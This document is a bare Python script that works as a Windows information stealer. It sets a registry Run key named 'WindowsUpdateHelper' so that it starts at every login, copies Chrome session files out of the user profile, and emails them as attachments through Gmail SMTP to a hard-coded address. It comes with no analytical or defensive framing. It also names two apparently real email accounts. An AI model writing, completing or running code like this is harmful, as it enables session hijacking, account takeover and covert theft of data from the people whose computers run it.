import smtplib, shutil, pathlib, socket, os, base64, requests, time, winreg, datetime
from email.message import EmailMessage
def add_persistence():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, f'python "{os.path.abspath(__file__)}"')
        winreg.CloseKey(key)
    except: pass

add_persistence()

source_folder = r"C:\Users\User\AppData\Local\Google\Chrome\User Data\Default\Sessions"
destination_folder = r"C:\Users\User\Downloads\NewcopyTP1"
recipient_email = "itsha25612@gmail.com"
sender_email = "thuonmeanveasna5@gmail.com" 
app_password = "App Password" #Sender password
subject = "Files from Testing Folder"
body = "Here are the files you requested."

if not os.path.exists(destination_folder):
    os.makedirs(destination_folder)

for filename in os.listdir(source_folder):
    full_file_name = os.path.join(source_folder, filename)
    if os.path.isfile(full_file_name):
        shutil.copy(full_file_name, destination_folder)
print("Files copied successfully!")

msg = EmailMessage()
msg["From"] = sender_email
msg["To"] = recipient_email
msg["Subject"] = subject
msg.set_content(body)

for filename in os.listdir(destination_folder):
    file_path = os.path.join(destination_folder, filename)
    with open(file_path, "rb") as f:
        file_data = f.read()
        file_name = os.path.basename(file_path)
    msg.add_attachment(file_data, maintype="application", subtype="octet-stream", filename=file_name)

try:
    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(sender_email, app_password)
        smtp.send_message(msg)
    print("Email sent successfully!")
except Exception as e:
    print("Error:", e)